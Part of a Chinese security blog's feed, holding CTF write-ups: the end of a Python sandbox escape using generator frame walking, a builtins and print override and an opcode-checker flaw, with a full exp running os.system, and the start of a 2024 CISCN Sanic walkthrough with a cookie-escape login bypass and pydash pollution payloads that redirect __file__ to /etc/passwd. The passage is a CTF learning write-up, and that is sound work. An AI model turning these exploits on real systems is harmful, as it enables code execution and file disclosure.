使用<code>sys.addaudithook</code>在运行时监控并禁止了<code>open</code>, <code>os</code>, <code>sys</code>等一系列敏感事件</p><p><strong>执行环境限制</strong>: 通过<code>exec(code, &#123;&quot;__builtins__&quot;: None, ...&#125;)</code>执行代码，<code>__builtins__</code>被设为<code>None</code>，并且全局作用域中只提供了<code>randint</code>, <code>randrange</code>, <code>seed</code>, <code>print</code> 四个函数</p><p>限制得很死，很多方法都没法用，这时我们就可以考虑用栈帧回溯来做，核心思路如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">q = (q.gi_frame.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line"><span class="built_in">globals</span> = [*q][<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>获取到全局变量之后就可以尝试获取<code>builtins</code>模块，双下划线被过滤我们可以用字符串拼接完成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">builtins = <span class="built_in">globals</span>[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_builtins_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>]</span><br></pre></td></tr></table></figure><p>接下来就是想办法绕过<code>block_wrapper</code>检查，因为<code>audithook</code>是运行时审计，所以想通过变量赋值方式绕过是不行的</p><p><img src="https://oss.waynejoons.icu/picphoto/20251030192353634.png"></p><p>如果检测到名单中的字符串就会打印并退出，因为<code>print</code>是在<code>builtins</code>模块里的，因此我们可以重写<code>print</code>方法，修改<code>os._exit</code>为其他函数即可成功跳出该沙箱</p><p><img src="https://oss.waynejoons.icu/picphoto/20251030192717330.png"></p><p>代码跟上面获取<code>builtins</code>的方式差不多，因为<code>os</code>在本地符号表，所以这里我们用<code>locals</code>，然后用<code>setattr</code>来重写<code>os._exit</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20251030194045992.png"></p><p>这里往上跳两层到本地就可以，不需要跳到全局，具体如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rewrite_print</span>(<span class="params">a</span>):</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_locals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">locals</span> = [*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">in</span> <span class="built_in">locals</span>:</span><br><span class="line">    builtins.<span class="built_in">setattr</span>(<span class="built_in">locals</span>[<span class="string">&#x27;os&#x27;</span>], <span class="string">&#x27;_ex&#x27;</span>+<span class="string">&#x27;it&#x27;</span>, <span class="built_in">print</span>)</span><br><span class="line">builtins.<span class="built_in">print</span> = rewrite_print</span><br></pre></td></tr></table></figure><p>接下来从<code>builtins</code>提取eval，获取<code>import</code>再导入<code>os</code>调用<code>system</code>即可实现RCE</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span> = builtins.<span class="built_in">eval</span></span><br><span class="line">imp = <span class="built_in">eval</span>(<span class="string">&#x27;builtins._&#x27;</span>+<span class="string">&#x27;_import_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">system = imp(<span class="string">&quot;os&quot;</span>).system</span><br><span class="line">system(<span class="string">&quot;ls /&quot;</span>)</span><br></pre></td></tr></table></figure><p>将上面的拼接起来，可以得到一个骨架</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">q = (q.gi_frame.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line"><span class="built_in">globals</span> = [*q][<span class="number">0</span>]</span><br><span class="line">builtins = <span class="built_in">globals</span>[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_builtins_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rewrite_print</span>(<span class="params">a</span>):</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_locals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">locals</span> = [*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">in</span> <span class="built_in">locals</span>:</span><br><span class="line">    builtins.<span class="built_in">setattr</span>(<span class="built_in">locals</span>[<span class="string">&#x27;os&#x27;</span>], <span class="string">&#x27;_ex&#x27;</span>+<span class="string">&#x27;it&#x27;</span>, <span class="built_in">print</span>)</span><br><span class="line">builtins.<span class="built_in">print</span> = rewrite_print</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span> = builtins.<span class="built_in">eval</span></span><br><span class="line">imp = <span class="built_in">eval</span>(<span class="string">&#x27;builtins._&#x27;</span>+<span class="string">&#x27;_import_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">system = imp(<span class="string">&quot;os&quot;</span>).system</span><br><span class="line">system(<span class="string">&quot;ls /&quot;</span>)</span><br></pre></td></tr></table></figure><p>最后我们想办法绕过<code>source_opcode_checker</code>，仔细分析可以发现该函数存在一个逻辑漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> opcode:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;seed&quot;</span>]):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>] <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>(line)]))</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>这里的<code>break</code>会直接跳出整个<code>for</code>循环，而不是<code>continue</code>继续检查下一行字节码，我们只要想办法触发<code>break</code>，那么后续所有代码的字节码都不会被检查</p><p>一开始我想通过在开头加个<code>print(1)</code>来触发<code>break</code>，但是试了一下发现返回<code>LOAD_GLOBAL</code>，也就是检测到了<code>LOAD_GLOBAL</code>但是没检测到<code>print(1)</code>，导致<code>exit</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20251030202144684.png"></p><p>开个本地调试观察分析，下个断点</p><p><img src="https://oss.waynejoons.icu/picphoto/20251030202426568.png"></p><p>发现有个<code>LOAD_GLOBAL q</code>，q指的是我们前面写的生成器，又因为在生成器内部尝试引用q，所以触发了<code>LOAD_GLOBAL</code>，但是q不是白名单里的，所以就<code>exit</code>了</p><p><img src="https://oss.waynejoons.icu/picphoto/20251030202532815.png"></p><p>那<code>print</code>呢，我们打开<code>opcode</code>，可以发现<code>print</code>不是<code>LOAD_GLOBAL</code>，而是<code>LOAD_NAME</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20251030203359781.png"></p><p>后面问AI说是版本问题，Python 3.11+是<code>LOAD_NAME</code>，那只能换个办法</p><p><img src="https://oss.waynejoons.icu/picphoto/20251030203652176.png"></p><p>前面我们知道生成器反汇编之后有个<code>LOAD_GLOBAL</code>，那我们尝试在生成器里面引用<code>print</code>试试，开头改为<code>(print for _ in [1])</code>，重新下断点调试</p><p><img src="https://oss.waynejoons.icu/picphoto/20251030204525780.png"></p><p>这次就没问题了，成功绕过<code>source_opcode_checker</code>限制</p><p>组合起来，完整的exp就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">print</span> <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">q = (q.gi_frame.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line"><span class="built_in">globals</span> = [*q][<span class="number">0</span>]</span><br><span class="line">builtins = <span class="built_in">globals</span>[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_builtins_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rewrite_print</span>(<span class="params">a</span>):</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_locals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">locals</span> = [*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">in</span> <span class="built_in">locals</span>:</span><br><span class="line">    builtins.<span class="built_in">setattr</span>(<span class="built_in">locals</span>[<span class="string">&#x27;os&#x27;</span>], <span class="string">&#x27;_ex&#x27;</span>+<span class="string">&#x27;it&#x27;</span>, <span class="built_in">print</span>)</span><br><span class="line">builtins.<span class="built_in">print</span> = rewrite_print</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span> = builtins.<span class="built_in">eval</span></span><br><span class="line">imp = <span class="built_in">eval</span>(<span class="string">&#x27;builtins._&#x27;</span>+<span class="string">&#x27;_import_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">system = imp(<span class="string">&quot;os&quot;</span>).system</span><br><span class="line">system(<span class="string">&quot;ls /&quot;</span>)</span><br></pre></td></tr></table></figure><p>我们写个python脚本来转换成Json数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(print for _ in [1])</span></span><br><span class="line"><span class="string">q = (q.gi_frame.f_back.f_back.f_globals for _ in [1])</span></span><br><span class="line"><span class="string">globals = [*q][0]</span></span><br><span class="line"><span class="string">builtins = globals[&#x27;_&#x27;+&#x27;_builtins_&#x27;+&#x27;_&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def rewrite_print(a):</span></span><br><span class="line"><span class="string">    q = (q.gi_frame.f_back.f_back.f_locals for _ in [1])</span></span><br><span class="line"><span class="string">    locals = [*q][0]</span></span><br><span class="line"><span class="string">    if &#x27;os&#x27; in locals:</span></span><br><span class="line"><span class="string">    builtins.setattr(locals[&#x27;os&#x27;], &#x27;_ex&#x27;+&#x27;it&#x27;, print)</span></span><br><span class="line"><span class="string">builtins.print = rewrite_print</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">eval = builtins.eval</span></span><br><span class="line"><span class="string">imp = eval(&#x27;builtins._&#x27;+&#x27;_import_&#x27;+&#x27;_&#x27;)</span></span><br><span class="line"><span class="string">system = imp(&quot;os&quot;).system</span></span><br><span class="line"><span class="string">system(&quot;ls /&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">json_code = json.dumps(&#123;<span class="string">&quot;code&quot;</span>: code&#125;)</span><br><span class="line"><span class="built_in">print</span>(json_code)</span><br></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\n(print for _ in [1])\nq = (q.gi_frame.f_back.f_back.f_globals for _ in [1])\nglobals = [*q][0]\nbuiltins = globals[&#x27;_&#x27;+&#x27;_builtins_&#x27;+&#x27;_&#x27;]\n\ndef rewrite_print(a):\n    q = (q.gi_frame.f_back.f_back.f_locals for _ in [1])\n    locals = [*q][0]\n    if &#x27;os&#x27; in locals:\n        builtins.setattr(locals[&#x27;os&#x27;], &#x27;_ex&#x27;+&#x27;it&#x27;, print)\nbuiltins.print = rewrite_print\n\neval = builtins.eval\nimp = eval(&#x27;builtins._&#x27;+&#x27;_import_&#x27;+&#x27;_&#x27;)\nsystem = imp(\&quot;os\&quot;).system\nsystem(\&quot;ls /\&quot;)\n&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>放入网站执行，类型要改为<code>application/json</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20251030212513452.png"></p><p>成功拿到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20251030212540427.png"></p>]]></content>
    
    
    <summary type="html">Python栈帧沙箱逃逸解析</summary>
    
    
    
    <category term="Python安全" scheme="https://waynejoon.github.io/categories/Python%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Python安全" scheme="https://waynejoon.github.io/tags/Python%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>2024CISCN Sanic复现</title>
    <link href="https://waynejoon.github.io/posts/2024CISCN_Sanic/"/>
    <id>https://waynejoon.github.io/posts/2024CISCN_Sanic/</id>
    <published>2025-10-08T08:11:46.000Z</published>
    <updated>2025-11-10T04:10:27.368Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Sanic框架介绍"><a href="#Sanic框架介绍" class="headerlink" title="Sanic框架介绍"></a>Sanic框架介绍</h2><p>Sanic 是一个基于 Python 的高性能异步 Web 框架，利用 Python 的 async&#x2F;await 语法实现非阻塞、高并发请求处理。它设计轻量、易用，支持快速定义路由、中间件和 WebSocket，适合构建现代化、响应迅速的 Web 应用和 API，性能在 Python Web 框架中处于领先地位</p><p>简单示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Sanic(<span class="string">&quot;MyApp&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> json(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hello, Sanic!&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><h2 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h2><p>这里我们用ctfshow的环境来复现</p><h3 id="起点"><a href="#起点" class="headerlink" title="起点"></a>起点</h3><p>打开网站后访问<code>/src</code>获取源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>发现<code>/admin</code>路由有<code>pydash.set_(pollute, key, value)</code>，且题目特意标明<code>pydash==5.1.2</code>，网上搜索可知可以用于参数污染，我们尝试污染<code>__file__</code>，但是需要先满足<code>request.ctx.session.get(&#39;admin&#39;) == True</code></p><p>先看<code>/login</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br></pre></td></tr></table></figure><p>在cookie接受参数user，当<code>user.lower() == &#39;adm;n&#39;</code>时返回true，但是直接传<code>adm;n</code>肯定是不行的，分号会截断内容</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>这时我们可以分析一下代码，简单讲一下环境配置</p><p>在源码中可以看到导入的依赖文件</p><p><img src="https://oss.waynejoons.icu/picphoto/20251007192145023.png"></p><p>先创建并激活虚拟环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m venv venv</span><br><span class="line">venv\Scripts\activate</span><br></pre></td></tr></table></figure><p>接着安装依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install sanic sanic-session pydash==5.1.2</span><br></pre></td></tr></table></figure><p>然后PyCharm打开<code>site-packages</code>文件即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20251007193005060.png"></p><h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>在<code>sanic/cookies/request.py</code>可以看到有关cookie的解码逻辑</p><p><img src="https://oss.waynejoons.icu/picphoto/20251007203505551.png"></p><p>可以看到这里将八进制转换为ASCII编码，然后开头要求字符串两端为双引号，那就很好绕过了，分号的八进制编码为<code>\073</code>，在<code>/login</code>处传入Cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&quot;adm\073n&quot;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20251007204746604.png"></p><p>成功登录</p><p>接着就是源码里的<code>if key and value and type(key) is str and &#39;_.&#39; not in key:</code>判断，要求不能出现<code>_.</code>，继续分析代码，在</p><p><code>pydash/utilities.py</code>找到方法<code>to_path_tokens</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20251007211100911.png"></p><p>跟进<code>RE_PATH_KEY_DELIM</code>，可以看到</p><p><img src="https://oss.waynejoons.icu/picphoto/20251007215922496.png"></p><p>正则里的 <code>(?&lt;!\\)</code> 是“负向零宽断言”，意思是匹配点号的这个位置，前面不能是单个反斜杠 <code>\</code>，然后<code>(?:\\\\)*</code> 是匹配偶数个反斜杠，因为每两个 <code>\</code> 表示一个反斜杠，两个反斜杠的成对出现会让点号有效，也就是说前面有成对的反斜杠不算转义，例如<code>__init__\\\\.__globals__</code>会解析为<code>__init__.__globals__</code>，解析时点号正常分割</p><p>那<code>_.</code>的问题就解决了，可以开始进行污染链的构造了</p><h3 id="污染链构造"><a href="#污染链构造" class="headerlink" title="污染链构造"></a>污染链构造</h3><p>先在<code>/login</code>处传入Cookie，获取session的值，浏览器会自动保存</p><p><img src="https://oss.waynejoons.icu/picphoto/20251007221858561.png"></p><p>接着我们构造链子读取文件，用HackBar的话记得要将enctype改为<code>application/json</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;/etc/passwd&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20251007223331193.png"></p><p>然后重新访问<code>/src</code>目录，成功污染</p><p><img src="https://oss.waynejoons.icu/picphoto/20251007223524013.png"></p><p>尝试污染路径为根目录下的flag，发现不行，说明flag要么不在这里要么不叫这个名字，而污染<code>__file__</code>只能是读取文件，那先放着，换个思路试试</p><p>继续分析，在源码处可以看到<code>app.static</code>这个注册路由，我们在本地<code>site-packages</code>目录创建个文件（<code>main.py</code>），把题目源码复制进去，方便后续分析</p><p>先看看<code>static</code>的定义</p><p><img src="https://oss.waynejoons.icu/picphoto/20251007225310673.png"></p><p>在注释处可以看到有两个关键参数说明</p><p><img src="https://oss.waynejoons.icu/picphoto/20251007225407107.png"></p><p>意思大概是<code>directory_view</code>为true时，会开启列目录功能，而<code>directory_handler</code>可以获取指定的目录</p><p>跟进<code>directory_handler</code>，这里我们要找<code>directory_handler</code>是如何定义的</p><p><img src="https://oss.waynejoons.icu/picphoto/20251007225642416.png"></p><p>可以看到有个方法<code>DirectoryHandler</code>，继续跟进看看</p><p><img src="https://oss.waynejoons.icu/picphoto/20251007225800912.png"></p><p>成功找到值的初始化定义，我们想办法污染这两个参数，让<code>directory_view</code>为true，然后<code>directory</code>为我们想要的目录</p><p>但是我们应该通过什么进行污染，为了进一步分析，我们需要在本地进行调试，这里简单改一下源码（<code>main.py</code>），把鉴权代码全部注释掉方便后续调试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 